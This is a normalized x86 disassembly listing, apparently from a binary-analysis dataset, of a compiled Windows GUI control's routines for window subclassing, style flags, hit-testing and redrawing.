mov eax [ ebp - 0x14 ]
inc eax
add [ ebp - 0x18 ] eax
add [ ebp - 0x24 ] eax
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438aac
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_438940
mov [ edi ] ax
add edi 0x2
inc esi
dec ebx
jne r-xdata
sub_4393b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
mov [ edi + 0x4 ] esi
xor edx edx
mov eax edi
call sub_439428
xor edx edx
mov eax edi
call sub_43943c
mov dl 0x1
mov eax edi
call sub_439450
mov eax edi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_439464
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4383d4
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_40456c
push eax
mov eax [ ebx + 0x24 ]
call sub_40456c
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4383d4
mov esi eax
mov eax ebx
call sub_4383d4
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4394d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_451d80
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xfa
mov eax ebx
call sub_44f010
mov edx 0x96
mov eax ebx
call sub_44f034
mov dl 0x1
mov eax ebx
call sub_43a3b8
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x128 ]
xor edx edx
mov eax ebx
call sub_44fa18
mov dl 0x1
mov eax ebx
call sub_456288
mov dl 0x1
mov eax ebx
call sub_43a798
mov dl 0x1
mov eax ebx
call sub_43a43c
mov dl 0x1
mov eax ebx
call sub_43a3cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov esi eax
mov [ ebx + 0x210 ] esi
mov eax esi
mov edx ebx
call sub_44e430
mov [ ebx + 0x26c ] 0xffffffff
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437d08
mov [ ebx + 0x23c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xfc ]
mov [ ebx + 0x22c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov [ ebx + 0x28c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4393b4
mov [ ebx + 0x234 ] eax
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419a68
mov [ ebx + 0x290 ] eax
mov [ ebx + 0x294 ] 0x0
mov [ ebx + 0x295 ] 0x0
xor eax eax
mov [ ebx + 0x2a0 ] eax
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c91c
mov [ ebx + 0x224 ] eax
push ebx
push sub_439f40
call sub_466600
mov [ ebx + 0x250 ] eax
push ebx
push sub_439e48
call sub_466600
mov [ ebx + 0x25c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_439c24
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x280 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_439c24
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0x284 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_439c24
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4396b8
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax [ esi + 0x224 ]
call sub_4032b0
mov eax [ esi + 0x23c ]
call sub_4032b0
mov eax [ esi + 0x28c ]
call sub_4032b0
mov eax [ esi + 0x22c ]
call sub_4032b0
mov eax [ esi + 0x234 ]
call sub_4032b0
mov eax [ esi + 0x240 ]
call sub_4032b0
mov eax [ esi + 0x248 ]
call sub_4032b0
mov eax [ esi + 0x24c ]
call sub_4032b0
mov eax [ esi + 0x290 ]
call sub_4032b0
mov eax [ esi + 0x250 ]
call sub_466614
mov eax [ esi + 0x264 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ esi + 0x25c ]
call sub_466614
mov eax [ esi + 0x27c ]
call sub_4032b0
mov eax [ esi + 0x280 ]
call sub_4032b0
mov eax [ esi + 0x284 ]
call sub_4032b0
mov eax [ esi + 0x210 ]
call sub_4032b0
xor eax eax
mov [ esi + 0x210 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451ea4
test bl bl
jle r-xdata
mov edx [ esi + 0x260 ]
push edx
push 0xfffffffc
push eax
call SetWindowLongA
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_4397b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_436100
mov edx esi
mov eax ebx
call sub_452ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_452e0c
mov edx [ esi + 0x4 ]
or edx 0x2000000
xor ecx ecx
mov cl [ ebx + 0x215 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x214 ]
or edx [ ecx * 4 + rw-data ]
mov eax [ ebx + 0x234 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x216 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x228 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x238 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x9 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0xa ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22b ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22a ]
or edx [ eax * 4 + rw-data ]
or edx 0x40
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x244 ] 0x0
je r-xdata
cmp [ ebx + 0x245 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x1000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x400
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4398e4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_41964c
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43996c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41defc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
call sub_41c5b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_439998
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45300c
mov eax [ ebp - 0x4 ]
call sub_43a060
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_43a470
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43a450
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x268 ]
mov eax [ ebp - 0x4 ]
call sub_43a4a4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_437d9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x218 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438b90
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x1
xor eax eax
push ebp
push sub_439ac2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_41964c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ ebp - 0x4 ]
call sub_41b1f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x21c ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_45ca94
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2a0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438b54
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_45ca94
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_45cbd0
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_439bfc
push ebp
call sub_4398e4
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_44f948
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438d6c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_43a15c
mov eax [ ebp - 0x4 ]
call sub_43c6a8
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_45ca94
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_45cbd0
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_439bfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_45cbd0
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_439bfc
sub_439b80
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41aeec
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x240 ] eax
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x240 ]
call sub_41b258
push 0x0
push 0x0
mov eax [ ebx + 0x240 ]
call sub_41ae88
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_438a7c
mov [ ebx + 0x2a0 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_4533f0
pop ebx
retn
mov eax ebx
call sub_43a1e8
sub_439bfc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_456054
mov ecx edi
mov edx esi
call sub_42a5c4
sub_439c24
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_45ca94
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_45cbd0
jmp r-xdata
cmp esi [ ebx + 0x21c ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_439bfc
jmp r-xdata
cmp esi [ ebx + 0x218 ]
jne r-xdata
cmp esi [ ebx + 0x220 ]
jne r-xdata
mov ecx 0x1
mov edx eax
mov eax ebx
call sub_439bfc
jmp r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_439bfc
sub_439c98
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44ed24
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x218 ]
jne r-xdata
cmp esi [ edi + 0x21c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43bfa4
cmp esi [ edi + 0x220 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43c014
xor edx edx
mov eax edi
call sub_43c08c
sub_439d0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_439e3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419720
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419720
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a980
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_439e19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x295 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d044
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
sub_439e48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439f21
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx ]
mov eax esi
sub eax 0x82
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x264 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x260 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x191
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x295 ] 0x0
je r-xdata
push ebp
call sub_439d0c
pop ecx
jmp r-xdata
sub_439f40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a021
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x105
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_454f90
test al al
je r-xdata
sub eax 0x100
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_454ea8
test al al
je r-xdata
dec eax
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455058
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
sub_43a040
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_456054
mov ecx edi
mov edx esi
call sub_42a6e8
pop edi
pop esi
pop ebx
retn
sub_43a060
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov esi 0x402
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edi eax
xor edx edx
mov eax ebx
call sub_43c08c
cmp [ ebx + 0x277 ] 0x0
je r-xdata
mov esi 0x4
cmp [ ebx + 0x278 ] 0x0
je r-xdata
or esi 0x1
cmp [ ebx + 0x27a ] 0x0
je r-xdata
or esi 0x8
cmp [ ebx + 0x275 ] 0x0
je r-xdata
or esi 0x20
cmp [ ebx + 0x276 ] 0x0
je r-xdata
or esi 0x100
cmp [ ebx + 0x294 ] 0x0
je r-xdata
or esi 0x10
test [ ebx + 0x279 ] 0x1
je r-xdata
or esi 0x2000
mov al [ r-xdata ]
and al [ ebx + 0x279 ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
or esi 0x40
jmp r-xdata
test [ ebx + 0x279 ] 0x4
je r-xdata
or esi 0x80
test [ ebx + 0x279 ] 0x2
je r-xdata
or esi 0x800
mov eax ebx
call sub_456054
mov edx esi
call sub_42a94c
test edi edi
je r-xdata
or esi 0x1000
mov edx edi
mov eax ebx
call sub_43c08c
sub_43a15c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x22c ]
call sub_438a7c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x24c ]
call sub_4032b0
xor eax eax
mov [ ebx + 0x24c ] eax
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
mov al [ eax + 0x2a ]
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
pop edx
call sub_438458
mov edx esp
mov ecx 0x1
mov ebp [ eax ]
call [ ebp + 0xc ]
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
mov dl [ esp ]
call sub_438458
jmp r-xdata
mov eax [ ebx + 0x24c ]
test eax eax
je r-xdata
inc esi
dec edi
jne r-xdata
sub_43a1e8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x24c ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41aeec
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x24c ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x24c ]
call sub_41ae88
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x22c ]
call sub_438a7c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_438aac
call sub_438414
mov [ esp ] al
mov edx esp
mov ecx 0x1
mov eax [ ebx + 0x24c ]
mov ebp [ eax ]
call [ ebp + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_43a26c
push ebx
push esi
push edi
mov ebx eax
cmp dl [ ebx + 0x274 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x274 ] dl
mov eax ebx
call sub_43a060
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_438a7c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_43a15c
jmp r-xdata
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
call sub_4388f4
push eax
mov eax ebx
call sub_456054
pop edx
call sub_42a884
test eax eax
setne al
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
pop edx
mov [ eax + 0x2a ] dl
inc esi
dec edi
jne r-xdata
sub_43a314
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x279 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x279 ] al
mov eax ebx
call sub_43a060
sub_43a33c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x244 ]
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x22c ]
call sub_438b70
mov [ esi + 0x244 ] bl
mov eax esi
call sub_4535f4
sub_43a3e0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
mov cl 0x1
mov edx 0x3
call sub_438608
mov eax ebx
call sub_43c154
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43c154
xor ecx ecx
mov edx 0x3
call sub_438608
pop esi
pop ebx
retn
sub_43a470
push ebx
mov ebx eax
mov eax [ ebx + 0x70 ]
call sub_423f34
push eax
mov eax ebx
call sub_456054
pop edx
call sub_42a7e4
mov eax [ ebx + 0x70 ]
call sub_423f34
push eax
mov eax ebx
call sub_456054
pop edx
call sub_42a5ac
pop ebx
retn
sub_43a4a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x268 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x268 ] esi
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax ebx
call sub_456054
mov edx esi
call sub_42a900
sub_43a4d4
push ebx
mov ebx eax
mov eax ebx
call sub_455588
mov eax ebx
call sub_456358
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x70 ]
mov eax ebx
call sub_43a470
sub_43a4f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_45566c
pop esi
pop ebx
retn
mov eax ebx
call sub_4535f4
sub_43a51c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a71b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_454364
mov eax ebx
call sub_43a74c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a722
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
mov eax [ esi + 0x8 ]
mov eax [ eax ]
cmp eax [ ebx + 0x264 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffec9
je r-xdata
mov [ ebx + 0x295 ] 0x1
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax edx
mov edi [ eax + 0x14 ]
test [ edi ] 0x1
je r-xdata
sub eax 0x2
je r-xdata
mov edx [ eax + 0xc ]
mov eax ebx
call sub_43d044
mov esi eax
mov eax [ esi + 0x18 ]
cmp eax [ edi + 0x4 ]
jl r-xdata
mov edi edx
mov edx [ edi + 0xc ]
mov eax ebx
call sub_43d044
mov esi eax
mov eax ebx
call sub_456054
mov edx [ edi + 0xc ]
call sub_42a774
mov edx eax
mov eax esi
call sub_437ba8
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
sub eax 0x12c
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jle r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
call GetMessagePos
call sub_406c70
movzx eax ax
push eax
call GetMessagePos
movzx eax ax
lea ecx [ ebp - 0x8 ]
pop edx
call sub_406158
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f398
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
mov eax ebx
call sub_456054
push eax
call ChildWindowFromPoint
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax esi
call sub_437ba8
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
mov eax ebx
call sub_456054
cmp esi eax
je r-xdata
mov [ edi + 0x4 ] eax
lea eax [ ebp - 0xc ]
mov edx 0x50
call sub_4046f8
mov eax [ ebp - 0xc ]
call sub_40436c
push eax
mov eax [ ebp - 0xc ]
call sub_40456c
push eax
push esi
call GetClassNameA
mov edx eax
lea eax [ ebp - 0xc ]
call sub_4046f8
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f398
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push 0x1206
push esi
call SendMessageA
test eax eax
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_43d044
mov edx eax
lea ecx [ ebp - 0x1c ]
mov eax ebx
mov si 0xffaf
call sub_4034ac
sub_43a758
push ebx
mov ebx eax
mov eax ebx
call sub_4555b0
mov eax ebx
call sub_456358
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_43a450
mov eax ebx
call sub_43a74c
test al al
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x264 ]
push eax
call InvalidateRect
sub_43a7c0
push ebx
push esi
mov esi edx
mov ebx [ eax + 0x234 ]
mov dl [ esi + 0x8 ]
mov eax ebx
call sub_439428
mov dl [ esi + 0x9 ]
mov eax ebx
call sub_43943c
